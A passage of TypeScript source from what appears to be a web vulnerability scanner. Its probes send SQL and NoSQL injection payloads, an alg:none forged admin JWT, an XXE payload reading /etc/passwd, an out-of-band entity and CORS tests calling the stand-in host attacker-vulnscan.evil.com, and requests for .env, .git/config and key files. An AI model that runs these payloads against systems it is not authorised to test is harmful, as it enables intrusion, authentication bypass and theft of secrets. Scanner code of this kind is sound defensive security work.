          testUrl.searchParams.set(param, origVal + payload);
          const start = Date.now();
          const resp = await fetch(testUrl.toString(), {
            headers: FETCH_HEADERS,
            signal: AbortSignal.timeout(10000),
            // @ts-ignore
            next: { revalidate: 0 },
          }).catch(() => null);
          const elapsed = Date.now() - start;
          // Confirm if response took ≥3.5s longer than baseline (accounting for network variance)
          if (resp && elapsed > baselineTime + 3500) {
            // Verify with 2 more measurements to eliminate network jitter
            let hitCount = 1;
            for (let i = 0; i < 2; i++) {
              const start2 = Date.now();
              await fetch(testUrl.toString(), {
                headers: FETCH_HEADERS,
                signal: AbortSignal.timeout(10000),
                // @ts-ignore
                next: { revalidate: 0 },
              }).catch(() => null);
              if ((Date.now() - start2) > baselineTime + 3500) hitCount++;
            }

            if (hitCount >= 2) {
              return {
                type: "sql-injection-blind-timing",
                severity: "CRITICAL",
                url: testUrl.toString(),
                parameter: param,
                evidence: `Blind Time-Based SQL Injection confirmed via ${db} SLEEP payload. The request with payload "${payload}" in parameter "${param}" took >3.5s longer than baseline on multiple attempts. This proves SQL injection even without visible error messages. An attacker can use time delays to extract the entire database character by character.`,
                cvssScore: 9.8,
                cveId: "CWE-89",
                confidence: CONFIDENCE.TIMING_VERIFIED,
                validationSteps: [`Baseline response time: ${baselineTime}ms`, `Payload "${payload}" triggered ${elapsed}ms delay (>${baselineTime + 3500}ms threshold)`, `Timing confirmed on ${hitCount}/3 additional measurements`],
                isVerified: true,
              };
            }
          }
        } catch { /* next payload */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

/**
 * Boolean-Blind SQL Injection via Response Diffing.
 * Sends a known-true and known-false condition, then compares response
 * bodies/lengths. If they differ significantly, it indicates the SQL
 * condition is being evaluated by the database.
 */
async function probeBlindSQLiBooleanDiff(paramUrl: string): Promise<PendingFinding | null> {
  try {
    const u = new URL(paramUrl);
    const params = [...u.searchParams.keys()];
    if (params.length === 0) return null;

    // Baseline: original unmodified request
    const baselineResp = await safeFetch(u.toString(), 8000);
    if (!baselineResp || baselineResp.status >= 500) return null;
    const baselineBody = await baselineResp.text();
    const baselineLen = baselineBody.length;

    for (const param of params.slice(0, 3)) {
      const origVal = u.searchParams.get(param) ?? "";

      // TRUE condition payloads
      const truePairs = [
        { truePayload: "' OR '1'='1'--", falsePayload: "' OR '1'='2'--" },
        { truePayload: "' OR 1=1--", falsePayload: "' OR 1=2--" },
        { truePayload: "1 OR 1=1", falsePayload: "1 OR 1=2" },
      ];

      for (const { truePayload, falsePayload } of truePairs) {
        try {
          // Send TRUE condition
          const trueUrl = new URL(u.toString());
          trueUrl.searchParams.set(param, origVal + truePayload);
          const trueResp = await safeFetch(trueUrl.toString(), 8000);
          if (!trueResp) continue;
          const trueBody = await trueResp.text();
          const trueLen = trueBody.length;

          // Send FALSE condition
          const falseUrl = new URL(u.toString());
          falseUrl.searchParams.set(param, origVal + falsePayload);
          const falseResp = await safeFetch(falseUrl.toString(), 8000);
          if (!falseResp) continue;
          const falseBody = await falseResp.text();
          const falseLen = falseBody.length;

          // Check 1: Are TRUE and FALSE responses different?
          const lenDelta = Math.abs(trueLen - falseLen);
          const avgLen = (trueLen + falseLen) / 2 || 1;
          const percentDiff = (lenDelta / avgLen) * 100;

          // Check 2: Is TRUE similar to baseline (original request)?
          const trueBaselineDelta = Math.abs(trueLen - baselineLen);
          const trueBaselinePercent = (trueBaselineDelta / (baselineLen || 1)) * 100;

          // Positive if: TRUE≠FALSE (>10% length diff) AND TRUE≈Baseline (<20% diff)
          if (percentDiff > 10 && trueBaselinePercent < 20 && lenDelta > 50) {
            // Verify with a second TRUE/FALSE pair to reduce false positives
            const verify = truePairs.find(p => p.truePayload !== truePayload);
            if (verify) {
              const vTrueUrl = new URL(u.toString());
              vTrueUrl.searchParams.set(param, origVal + verify.truePayload);
              const vFalseUrl = new URL(u.toString());
              vFalseUrl.searchParams.set(param, origVal + verify.falsePayload);
              const vTrue = await safeFetch(vTrueUrl.toString(), 8000);
              const vFalse = await safeFetch(vFalseUrl.toString(), 8000);
              if (!vTrue || !vFalse) continue;
              const vTrueLen = (await vTrue.text()).length;
              const vFalseLen = (await vFalse.text()).length;
              const vDelta = Math.abs(vTrueLen - vFalseLen);
              const vPercent = (vDelta / ((vTrueLen + vFalseLen) / 2 || 1)) * 100;
              if (vPercent < 5) continue; // Verification failed
            }

            return verifiedFinding(
              {
                type: "sql-injection-blind-boolean",
                severity: "CRITICAL",
                url: u.toString(),
                parameter: param,
                evidence: `Boolean-Blind SQL Injection confirmed via response diffing. TRUE condition ("${truePayload}") returned ${trueLen} bytes, FALSE condition ("${falsePayload}") returned ${falseLen} bytes (${percentDiff.toFixed(1)}% difference). Baseline was ${baselineLen} bytes. This proves the SQL condition is evaluated by the database — an attacker can extract data character by character.`,
                cvssScore: 9.8,
                cveId: "CWE-89",
              },
              [
                `Baseline response: ${baselineLen} bytes`,
                `TRUE payload "${truePayload}": ${trueLen} bytes`,
                `FALSE payload "${falsePayload}": ${falseLen} bytes`,
                `Length difference: ${lenDelta} bytes (${percentDiff.toFixed(1)}%)`,
                `Verified with second payload pair`,
              ],
              CONFIDENCE.DUAL_VERIFIED
            );
          }
        } catch { /* next payload pair */ }
      }
    }
  } catch { /* skip */ }
  return null;
}

/**
 * Host Header Injection
 * FP-FIX #3: Only flag when the evil host appears in security-sensitive
 * contexts (href, action, src attributes or Location header), not just
 * anywhere in the response body. Excludes 4xx/421 error responses.
 */
async function probeHostHeaderInjection(targetUrl: string): Promise<PendingFinding | null> {
  const EVIL_HOST = "attacker-vulnscan.evil.com";
  try {
    const resp = await fetch(targetUrl, {
      headers: {
        ...FETCH_HEADERS,
        Host: EVIL_HOST,
        "X-Forwarded-Host": EVIL_HOST,
        "X-Host": EVIL_HOST,
      },
      redirect: "manual",
      signal: AbortSignal.timeout(6000),
      // @ts-ignore
      next: { revalidate: 0 },
    }).catch(() => null);
    if (!resp) return null;

    // FP-FIX #3: Ignore 4xx/421 responses — server correctly rejected the bad Host
    if (resp.status >= 400 && resp.status < 500) return null;

    const body = await resp.text();
    // Check if injected host appears in Location redirect header
    const location = resp.headers.get("location") || "";
    if (location.includes(EVIL_HOST)) {
      return {
        type: "host-header-injection-redirect",
        severity: "HIGH",
        url: targetUrl,
        evidence: `Host Header Injection confirmed via redirect poisoning. The injected Host "${EVIL_HOST}" caused a redirect to ${location}. An attacker can use this to hijack OAuth flows, password resets, and any host-relative URL generation.`,
        cvssScore: 8.1,
        cveId: "CWE-20",
      };
    }

    if (body.includes(EVIL_HOST)) {
      //  Only flag if the evil host appears inside a security-sensitive
      // context (href, action, src, form target), not just echoed in error text
      const securitySensitivePattern = new RegExp(
        `(?:href|action|src|formaction|data-url)\\s*=\\s*["']?[^"']*${EVIL_HOST.replace(/\./g, '\\.')}`,
        'i'
      );
      if (securitySensitivePattern.test(body)) {
        return {
          type: "host-header-injection",
          severity: "MEDIUM",
          url: targetUrl,
          evidence: `Host Header Injection detected. The injected Host "${EVIL_HOST}" appears in an href/action/src attribute in the response body, indicating the application trusts the Host header for URL generation. Attackers can exploit this to poison password reset emails and redirect links.`,
          cvssScore: 6.5,
          cveId: "CWE-20",
        };
      }
      // Host echoed but not in a sensitive context — downgrade to INFO
      // (common for error pages, canonical tags, debug output)
    }
  } catch { /* skip */ }
  return null;
}

// ─────────────────────────────────────────────────────────────────────────────
//  STORED XSS DETECTION
// Inject unique markers into every form/param, then crawl all pages for them.
// ─────────────────────────────────────────────────────────────────────────────

interface StoredXSSInjection {
  marker: string;
  sourceUrl: string;
  parameter: string;
  injectedAt: number;
}


function makeStoredXSSMarker(): string {
  const uid = Math.random().toString(36).slice(2, 8).toUpperCase();
  return `<vulnscan-stored-${uid}>`;
}

async function injectStoredXSSMarkers(
  forms: FormTarget[],
  paramUrls: string[],
  pageUrl: string,
  markers: StoredXSSInjection[],
  session: AuthSession = EMPTY_SESSION
): Promise<void> {
  // Inject into forms
  for (const form of forms) {
    for (const field of form.fields) {
      if (/pass(word)?|pwd/i.test(field)) continue;
      const marker = makeStoredXSSMarker();
      try {
        const formData = new URLSearchParams();
        for (const f of form.fields) formData.set(f, f === field ? marker : "vulnscan_test");
        if (form.method === "POST") {
          await authedFetch(form.actionUrl, {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: formData.toString(),
          }, 8000, false, session);
        } else {
          const u = new URL(form.actionUrl);
          for (const [k, v] of formData) u.searchParams.set(k, v);
          await authedFetch(u.toString(), {}, 8000, false, session);
        }
        markers.push({ marker, sourceUrl: form.actionUrl, parameter: field, injectedAt: Date.now() });
      } catch { /* skip */ }
    }
  }

  // Inject into URL params
  for (const paramUrl of paramUrls.slice(0, 5)) {
    try {
      const u = new URL(paramUrl);
      for (const param of [...u.searchParams.keys()].slice(0, 3)) {
        const marker = makeStoredXSSMarker();
        const testUrl = new URL(u.toString());
        testUrl.searchParams.set(param, marker);
        await authedFetch(testUrl.toString(), {}, 8000, false, session);
        markers.push({ marker, sourceUrl: paramUrl, parameter: param, injectedAt: Date.now() });
      }
    } catch { /* skip */ }
  }
}

function checkStoredXSSReflection(pageHtml: string, pageUrl: string, markers: StoredXSSInjection[]): PendingFinding | null {
  for (const injection of markers) {
    if (Date.now() - injection.injectedAt > 30 * 60 * 1000) continue; // 30-min TTL
    if (pageHtml.includes(injection.marker)) {
      return {
        type: "stored-xss",
        severity: "CRITICAL",
        url: pageUrl,
        parameter: injection.parameter,
        evidence:
          `Stored XSS confirmed. Marker payload "${injection.marker}" was submitted ` +
          `to parameter "${injection.parameter}" at ${injection.sourceUrl}, ` +
          `and was found unencoded in the rendered HTML of ${pageUrl}. ` +
          `An attacker can persistently inject scripts that execute in every victim's browser — enabling mass session hijacking, keylogging, and account takeover without any user interaction beyond page load.`,
        cvssScore: 9.0,
        cveId: "CWE-79",
      };
    }
  }
  return null;
}

/**
 * Active CORS Reflection Test
 * FIX #6: Now tests ALL crawl-discovered API endpoints, not just 4 hardcoded paths.
 */
async function probeCORSReflection(targetUrl: string, extraEndpoints: string[] = [], session: AuthSession = EMPTY_SESSION): Promise<PendingFinding | null> {
  let baseHost = "target.com";
  try { baseHost = new URL(targetUrl).hostname; } catch {}
  const testOrigins = [
    "https://attacker-vulnscan.evil.com",
    "null",
    `https://${baseHost}.evil.com`,
  ];
  const basePaths = ["/api/", "/api/me", "/api/user", "/api/users", "/rest/user/whoami"];
  const allEndpoints = [
    targetUrl,
    ...basePaths.map(p => safeUrlJoin(targetUrl, p)).filter(Boolean) as string[],
    ...extraEndpoints.slice(0, 20),
  ];

  for (const url of allEndpoints) {
    for (const testOrigin of testOrigins) {
      try {
        const resp = await fetch(url, {
          headers: { ...FETCH_HEADERS, ...authHeaders(session), Origin: testOrigin },
          signal: AbortSignal.timeout(5000),
          // @ts-ignore
          next: { revalidate: 0 },
        }).catch(() => null);
        if (!resp) continue;
        const acao = resp.headers.get("access-control-allow-origin") || "";
        const acac = resp.headers.get("access-control-allow-credentials") || "";
        const withCreds = acac.toLowerCase() === "true";

        if (acao === testOrigin || (testOrigin !== "null" && acao.includes("attacker-vulnscan"))) {
          return {
            type: withCreds ? "cors-arbitrary-origin-with-credentials" : "cors-arbitrary-origin-reflected",
            severity: withCreds ? "CRITICAL" : "HIGH",
            url,
            evidence: withCreds
              ? `CRITICAL CORS Misconfiguration: The server reflects untrusted Origin ("${testOrigin}") in Access-Control-Allow-Origin AND specifies Access-Control-Allow-Credentials: true. Browsers will permit cross-origin authenticated API reading.`
              : `CORS Misconfiguration: The server reflects untrusted origin "${testOrigin}" in Access-Control-Allow-Origin header. Any third-party site can read unauthenticated responses from this endpoint.`,
            cvssScore: withCreds ? 9.6 : 7.5,
            cveId: "CWE-942",
            isVerified: true,
            confidence: CONFIDENCE.DETERMINISTIC,
          };
        }
      } catch { /* next origin */ }
    }
  }
  return null;
}



/**
 * HTTP Method Enumeration & Verb Tampering
 * FP-FIX #4: Only flags TRACE and CONNECT as genuinely dangerous.
 * PUT/DELETE/PATCH are standard REST API methods and are NOT dangerous by themselves.
 * TRACE method can enable Cross-Site Tracing (XST) attacks.
 */
async function probeDangerousHTTPMethods(targetUrl: string, apiPaths: string[]): Promise<PendingFinding | null> {
  const targets = [targetUrl, ...apiPaths.map(p => {
    try { return new URL(p, targetUrl).toString(); } catch { return ""; }
  }).filter(Boolean)].slice(0, 5);

  for (const url of targets) {
    try {
      // 1. TRACE method test (XST attack) — the only genuinely dangerous method via OPTIONS
      const traceResp = await fetch(url, {
        method: "TRACE",
        headers: { ...FETCH_HEADERS, "X-Sensitive-Header": "vulnscan-trace-test" },
        signal: AbortSignal.timeout(5000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);
      if (traceResp && traceResp.ok) {
        const body = await traceResp.text().catch(() => "");
        if (body.includes("vulnscan-trace-test")) {
          return {
            type: "http-trace-method-enabled",
            severity: "MEDIUM",
            url,
            evidence: `HTTP TRACE method is enabled at ${url}. TRACE reflects all request headers back in the response body. Combined with XSS or browser vulnerabilities, attackers can use Cross-Site Tracing (XST) to steal HttpOnly cookies that JavaScript cannot normally access.`,
            cvssScore: 6.3,
            cveId: "CWE-16",
          };
        }
      }

      // 2. OPTIONS probe — only flag TRACE and CONNECT (not PUT/DELETE/PATCH which are normal REST)
      const optResp = await fetch(url, {
        method: "OPTIONS",
        headers: FETCH_HEADERS,
        signal: AbortSignal.timeout(5000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);
      if (optResp) {
        const allowed = optResp.headers.get("allow") || optResp.headers.get("access-control-allow-methods") || "";
        const dangerous = ["TRACE", "CONNECT"].filter(m => allowed.toUpperCase().includes(m));
        if (dangerous.length > 0) {
          return {
            type: "dangerous-http-methods",
            severity: "MEDIUM",
            url,
            evidence: `HTTP OPTIONS response reveals genuinely dangerous methods: ${dangerous.join(", ")}. Allow header: "${allowed}". TRACE enables Cross-Site Tracing (XST) to steal cookies, CONNECT allows proxy tunneling.`,
            cvssScore: 6.3,
            cveId: "CWE-16",
          };
        }
      }
    } catch { /* skip */ }
  }
  return null;
}

/**
 * XML External Entity (XXE) Injection
 * POSTs crafted XML with external entity references to API endpoints.
 * Vulnerable parsers will attempt to resolve the entity, potentially leaking server files.
 */
async function probeXXE(targetUrl: string): Promise<PendingFinding | null> {
  const XXE_PAYLOAD = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`;

  const XXE_OOB_PAYLOAD = `<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY % ext SYSTEM "https://attacker-vulnscan.evil.com/xxe"> %ext;]>
<root/>`;

  const XML_ENDPOINTS = [
    "/api/",
    "/api/v1/",
    "/graphql",
    "/upload",
    "/import",
    "/parse",
    "/convert",
    "/data",
    "/feed",
    "/webhook",
  ];

  for (const path of XML_ENDPOINTS) {
    try {
      const url = new URL(path, targetUrl).toString();
      const resp = await fetch(url, {
        method: "POST",
        headers: {
          "Content-Type": "application/xml",
          "User-Agent": FETCH_HEADERS["User-Agent"],
          Accept: "application/xml,text/xml,*/*",
        },
        body: XXE_PAYLOAD,
        signal: AbortSignal.timeout(6000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);
      if (!resp) continue;
      const body = await resp.text();
      // File content indicators in response = confirmed XXE
      if (/root:x:0:0|bin\/bash|daemon:x|nobody:x/i.test(body)) {
        return {
          type: "xxe-injection",
          severity: "CRITICAL",
          url,
          evidence: `XML External Entity (XXE) Injection confirmed at ${url}. The server processed the external entity declaration and returned contents of /etc/passwd in the response. An attacker can read any file the web server user has access to, including private keys, source code, and configuration files containing database credentials.`,
          cvssScore: 9.1,
          cveId: "CWE-611",
        };
      }
      // FP-FIX #13: Removed speculative "xxe-endpoint-accepts-xml" finding.
      // An XML parsing error is the CORRECT, SAFE behavior — it means the parser
      // rejected the malicious payload. Only confirmed file disclosure is a true XXE.
    } catch { /* next endpoint */ }
  }
  return null;
}

/**
 * Prototype Pollution
 * Injects __proto__, constructor.prototype into URL params and form fields.
 * Vulnerable Node.js/JavaScript apps may allow polluting the global Object prototype.
 */
async function probePrototypePollution(paramUrl: string): Promise<PendingFinding | null> {
  const PROTO_PAYLOADS = [
    { param: "__proto__[vulnscan]", value: "vulnscan_polluted" },
    { param: "constructor[prototype][vulnscan]", value: "vulnscan_polluted" },
    { param: "__proto__.vulnscan", value: "vulnscan_polluted" },
  ];
  try {
    const u = new URL(paramUrl);
    for (const { param, value } of PROTO_PAYLOADS) {
      try {
        const testUrl = new URL(u.toString());
        testUrl.searchParams.set(param, value);
        const resp = await safeFetch(testUrl.toString(), 5000);
        if (!resp || resp.status !== 200) continue;
        const body = await resp.text();

        try {
          const json = JSON.parse(body);
          // Confirm top-level property pollution in response object
          if (json && typeof json === "object" && json.vulnscan === value) {
            // Verification step: send a clean request to see if prototype pollution persists across requests
            const cleanResp = await safeFetch(u.toString(), 5000);
            const cleanText = cleanResp ? await cleanResp.text().catch(() => "") : "";
            let isPersistent = false;
            try {
              const cleanJson = JSON.parse(cleanText);
              if (cleanJson && cleanJson.vulnscan === value) isPersistent = true;
            } catch { /* ignore */ }

            return {
              type: "prototype-pollution",
              severity: "HIGH",
              url: testUrl.toString(),
              parameter: param,
              evidence: `Prototype Pollution confirmed${isPersistent ? " (cross-request persistent)" : ""}. Injected parameter "${param}=${value}" polluted the global Object prototype graph.`,
              cvssScore: 8.0,
              cveId: "CWE-1321",
              isVerified: isPersistent,
              confidence: isPersistent ? CONFIDENCE.DUAL_VERIFIED : CONFIDENCE.SINGLE_PAYLOAD,
            };
          }
        } catch { /* not json */ }
      } catch { /* next */ }
    }
  } catch { /* skip */ }
  return null;
}

/**
 * NoSQL Injection
 * Probes POST auth/login endpoints, JSON POST APIs, and GET endpoints with MongoDB operators.
 * Catches authentication bypass and data disclosure.
 */
async function probeNoSQLi(targetUrl: string, jsBundleEndpoints: JsApiEndpoint[] = []): Promise<PendingFinding | null> {
  const NOSQL_PAYLOADS = [
    { "$gt": "" },
    { "$ne": "nonexistent" }
  ];

  const authPaths = [
    "/rest/user/login",
    "/api/login",
    "/api/auth/login",
    "/api/v1/auth/login",
    "/auth/login",
    "/login"
  ];

  // 1. Probe common auth POST endpoints
  for (const path of authPaths) {
    try {
      const url = new URL(path, targetUrl).toString();
      // First check if live
      const baseline = await fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
        body: JSON.stringify({ email: "nonexistent@nonexistent.com", password: "wrong" }),
        signal: AbortSignal.timeout(5000),
      }).catch(() => null);

      if (!baseline || baseline.status === 404) continue;

      for (const payload of NOSQL_PAYLOADS) {
        const body1 = { email: payload, password: payload };
        const body2 = { username: payload, password: payload };
        const body3 = { user: payload, pass: payload };

        for (const body of [body1, body2, body3]) {
          const resp = await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "User-Agent": FETCH_HEADERS["User-Agent"],
              "Accept": "application/json"
            },
            body: JSON.stringify(body),
            signal: AbortSignal.timeout(6000),
            // @ts-ignore
            next: { revalidate: 0 },
          }).catch(() => null);

          if (!resp) continue;
          const text = await resp.text();

          // FP-FIX #9 extended: NoSQLi auth bypass also requires real token
          if (resp.status === 200) {
            let hasRealToken = false;
            try {
              const json = JSON.parse(text);
              const tokenVal = json?.token || json?.data?.token || json?.authentication?.token ||
                json?.access_token || json?.accessToken || json?.jwt || "";
              hasRealToken = typeof tokenVal === "string" && tokenVal.length >= 20;
            } catch {
              hasRealToken = /eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/i.test(text);
            }
            if (hasRealToken) {
              return {
                type: "nosql-injection",
                severity: "CRITICAL",
                url,
                parameter: "email/username",
                evidence: `NoSQL Injection Authentication Bypass confirmed at ${url}. Submitting NoSQL query operator payload "${JSON.stringify(payload)}" in JSON body bypassed authentication and returned a valid session token (HTTP 200). This confirms the database (likely MongoDB) parses JSON query operators directly, allowing attackers to log in as arbitrary users without a password.`,
                cvssScore: 9.8,
                cveId: "CWE-943",
              };
            }
          }
        }
      }
    } catch { /* skip */ }
  }

  // 2. Probe JS-discovered endpoints for NoSQL injection
  for (const endpoint of jsBundleEndpoints) {
    try {
      const url = new URL(endpoint.path, targetUrl).toString();
      for (const payload of NOSQL_PAYLOADS) {
        for (const field of endpoint.fields) {
          const body: Record<string, any> = {};
          for (const f of endpoint.fields) {
            body[f] = f === field ? payload : "test";
          }

          const resp = await fetch(url, {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
              "User-Agent": FETCH_HEADERS["User-Agent"],
              "Accept": "application/json"
            },
            body: JSON.stringify(body),
            signal: AbortSignal.timeout(6000),
            // @ts-ignore
            next: { revalidate: 0 },
          }).catch(() => null);

          if (!resp) continue;
          const text = await resp.text();

          if (resp.status === 200 && text.includes("email") && text.includes("role") &&
            (endpoint.path.includes("user") || endpoint.path.includes("profile"))) {
            return {
              type: "nosql-injection",
              severity: "CRITICAL",
              url,
              parameter: field,
              evidence: `NoSQL Injection (Data Disclosure) confirmed at ${url}. Submitting NoSQL query operator payload "${JSON.stringify(payload)}" in field "${field}" forced the backend database to return database objects matching the query structure. An attacker can use these operators to bypass query logic and extract arbitrary records.`,
              cvssScore: 9.8,
              cveId: "CWE-943",
            };
          }
        }
      }
    } catch { /* skip */ }
  }

  return null;
}

/**
 * JWT Signature Bypass (None Algorithm)
 * Tests if the API accepts an unsigned JWT specifying 'alg: none' in the headers.
 */
async function probeJWTNone(targetUrl: string): Promise<PendingFinding | null> {
  const jwtEndpoints = [
    "/api/Users/1",
    "/api/users/1",
    "/api/v1/users/1",
    "/api/profile",
    "/api/orders",
    "/api/basket",
    "/api/feedbacks"
  ];

  let unsignedJwt: string;
  try {
    unsignedJwt = jwt.sign(
      { email: "admin@juice-sh.op", username: "admin", id: 1 },
      "",
      { algorithm: "none" as any }
    );
  } catch {
    unsignedJwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwidXNlcm5hbWUiOiJhZG1pbiIsImlkIjoxfQ.";
  }

  for (const path of jwtEndpoints) {
    try {
      const url = new URL(path, targetUrl).toString();

      const unauth = await fetch(url, {
        headers: FETCH_HEADERS,
        signal: AbortSignal.timeout(5000),
      }).catch(() => null);

      if (!unauth || (unauth.status !== 401 && unauth.status !== 403)) continue;

      const resp = await fetch(url, {
        headers: {
          ...FETCH_HEADERS,
          "Authorization": `Bearer ${unsignedJwt}`,
        },
        signal: AbortSignal.timeout(5000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);

      if (!resp) continue;

      if (resp.status === 200 || resp.status === 204) {
        const text = await resp.text().catch(() => "");
        if (isSpaHtmlFallback(resp, text)) continue;

        try {
          // Confirm valid JSON returned upon presenting unsigned token
          JSON.parse(text);
          return {
            type: "jwt-none-algorithm",
            severity: "CRITICAL",
            url,
            evidence: `Insecure JWT Configuration (Signature Bypass via 'none' Algorithm) confirmed at ${url}. The endpoint requires authentication (returned ${unauth.status} without credentials) but accepted a custom-crafted JWT specifying '"alg": "none"' in the header with an empty signature (returned ${resp.status} with valid JSON data).`,
            cvssScore: 9.8,
            cveId: "CWE-347",
            isVerified: true,
            confidence: CONFIDENCE.EXEC_VERIFIED,
          };
        } catch { /* not valid JSON, ignore soft 200 HTML pages */ }
      }
    } catch { /* skip */ }
  }
  return null;
}

// Helper to detect if an endpoint returns a soft-404 or a generic SPA fallback route
const isSoft404OrSPARedirect = (endpointBody: string, homepageBody: string, filePath?: string): boolean => {
  if (!homepageBody) return false;

  const trimmedEp = endpointBody.trim();
  const trimmedHome = homepageBody.trim();

  // 1. Exact body comparison (hashing equivalent)
  if (trimmedEp === trimmedHome) return true;

  // 2. HTML Markup detection: if the expected resource is NOT an HTML page/route,
  //    but the response starts with standard HTML document declarations, it's a fallback.
  if (filePath) {
    const isHtmlMarkup = trimmedEp.toLowerCase().startsWith("<!doctype html") ||
      trimmedEp.toLowerCase().startsWith("<html") ||
      trimmedEp.toLowerCase().startsWith("<!doctype");
    const expectedHtml = filePath.endsWith(".html") ||
      filePath.endsWith(".htm") ||
      filePath.endsWith("/");
    if (isHtmlMarkup && !expectedHtml) {
      return true;
    }
  }

  // 3. Page title heuristic
  const getTitle = (html: string) => {
    const m = html.match(/<title>([^<]+)<\/title>/i);
    return m ? m[1].trim() : "";
  };

  const homeTitle = getTitle(homepageBody);
  const epTitle = getTitle(endpointBody);

  if (homeTitle && epTitle && homeTitle === epTitle) {
    return true;
  }

  // 4. SPA Framework markers + close body length comparison
  const lenDiff = Math.abs(endpointBody.length - homepageBody.length);
  const threshold = homepageBody.length * 0.08; // 8% threshold
  if (lenDiff < threshold) {
    if (/__NEXT_DATA__|__nuxt|webpack|next\/static|react-root|#app|#root/i.test(endpointBody)) {
      return true;
    }
  }
  return false;
};

/**
 * Exposed Sensitive/Backup Files (Forgotten backups, environment files, git structure)
 */
async function probeExposedBackupFiles(targetUrl: string, homepageHtml?: string): Promise<PendingFinding | null> {
  const sensitiveFiles = [
    { path: "/ftp/package.json.bak", type: "JSON Developer Backup", pattern: /"dependencies"\s*:|"devDependencies"\s*:/ },
    { path: "/ftp/coupons_2013.md.bak", type: "Sales MD Backup", pattern: /coupon_code|discount_rate|COUPON2013/i },
    { path: "/ftp/eastere.gg", type: "Exposed Easter Egg File", pattern: /easter_egg_secret|easteregg_token/i },
    { path: "/encryptionkeys", type: "Exposed Encryption Keys Directory", pattern: /-----BEGIN (RSA|EC|OPENSSH|PRIVATE) KEY-----|PRIVATE_KEY_PEM/i },
    { path: "/ftp/", type: "FTP Directory Listing", pattern: /Index of \/ftp|Parent Directory/i },
    { path: "/.env", type: "Environment File", pattern: /(DB_PASSWORD|JWT_SECRET|AWS_SECRET_ACCESS_KEY)=/i },
    { path: "/.git/config", type: "Git Config", pattern: /\[core\][\s\S]*repositoryformatversion/i },
    { path: "/package.json.bak", type: "Package JSON Backup", pattern: /"dependencies"\s*:|"devDependencies"\s*:/ },
    { path: "/package-lock.json", type: "Package Lock File", pattern: /"lockfileVersion"\s*:|"packages"\s*:/ },
    { path: "/database.sqlite", type: "SQLite Database", pattern: /^SQLite format 3/ },
    { path: "/db.sqlite", type: "SQLite Database", pattern: /^SQLite format 3/ },
    { path: "/backup.zip", type: "ZIP Archive", pattern: /^PK\x03\x04/ },
    { path: "/wp-config.php.bak", type: "WordPress Config Backup", pattern: /define\(\s*['"]DB_PASSWORD['"]/i },
    { path: "/config.json", type: "Config JSON File", pattern: /"(database|db_password|jwt_secret|api_key)"\s*:/i },
  ];

  for (const file of sensitiveFiles) {
    try {
      const url = new URL(file.path, targetUrl).toString();
      const resp = await fetch(url, {
        headers: FETCH_HEADERS,
        signal: AbortSignal.timeout(6000),
        // @ts-ignore
        next: { revalidate: 0 },
      }).catch(() => null);

      if (!resp || resp.status !== 200) continue;

      const contentType = resp.headers.get("content-type") || "";
      const isExpectedHtml = file.path.endsWith(".html") || file.path.endsWith(".htm") || file.path.endsWith("/");
      if (!isExpectedHtml && contentType.includes("text/html")) {
        continue;
      }

      const text = await resp.text();

      // Non-HTML files must not contain HTML markup
      if (!isExpectedHtml && (text.trim().toLowerCase().startsWith("<!doctype html") || text.trim().toLowerCase().startsWith("<html"))) {
        continue;
      }

      // Eliminate SPA soft-404 / route fallback false positives
      if (homepageHtml && isSoft404OrSPARedirect(text, homepageHtml, file.path)) {
        continue;
      }

      if (file.pattern.test(text)) {
        return {
          type: "exposed-sensitive-file",
          severity: "HIGH",
          url,
          evidence: `Sensitive Data Exposure via Exposed Backup or Configuration File: "${file.type}" found at ${url}. The file is publicly accessible and contains sensitive details (e.g. system configurations, dependency manifests, database schema, or internal keys).`,
          cvssScore: 7.5,
          cveId: "CWE-538",
          isVerified: true,
          confidence: CONFIDENCE.DETERMINISTIC,
        };
      }
    } catch { /* skip */ }
  }
  return null;
}

/**
 * Directory Listing / Index Exposure
 * Checks if web server exposes file directory indexes on common paths.
 */
async function probeDirectoryListing(targetUrl: string, homepageHtml?: string): Promise<PendingFinding | null> {
  const DIRS = ["/uploads/", "/files/", "/backup/", "/static/", "/assets/", "/images/", "/logs/", "/tmp/", "/temp/", "/data/"];
  const INDEX_MARKERS = [/Index of \//i, /<title>Directory listing/i, /\[DIR\]/i, /Parent Directory/i, /Last modified.*Size/i];
  for (const dir of DIRS) {
    try {
      const url = new URL(dir, targetUrl).toString();
      const resp = await safeFetch(url, 4000);
      if (!resp || resp.status !== 200) continue;
      const body = await resp.text();

      // Eliminate SPA routing soft-404 redirects
      if (homepageHtml && isSoft404OrSPARedirect(body, homepageHtml)) {
        continue;
      }

      const hit = INDEX_MARKERS.find(p => p.test(body));
      if (hit) {
        return {
          type: "directory-listing-exposed",
          severity: "MEDIUM",
          url,
          evidence: `Directory listing is enabled at ${url}. The web server is showing a browsable file index. Attackers can enumerate all files in the directory, potentially discovering backup files, source code archives, configuration files, private keys, and user-uploaded data that should not be publicly accessible.`,
          cvssScore: 5.3,
          cveId: "CWE-548",
        };
      }
    } catch { /* skip */ }
  }
  return null;
}

/**
 * HTTP to HTTPS Redirect Check
 * Sites serving sensitive forms over HTTP or failing to redirect to HTTPS
 * expose all traffic to passive interception (MITM).
 */
async function probeHTTPSRedirect(targetUrl: string): Promise<PendingFinding | null> {
  if (targetUrl.startsWith("https://")) {
    try {
      const u = new URL(targetUrl);
      // Scope HTTPS redirect check to root host level only to avoid sub-path duplication
      if (u.pathname !== "/" && u.pathname !== "") return null;

      const httpUrl = `${u.protocol.replace("https", "http")}//${u.host}/`;
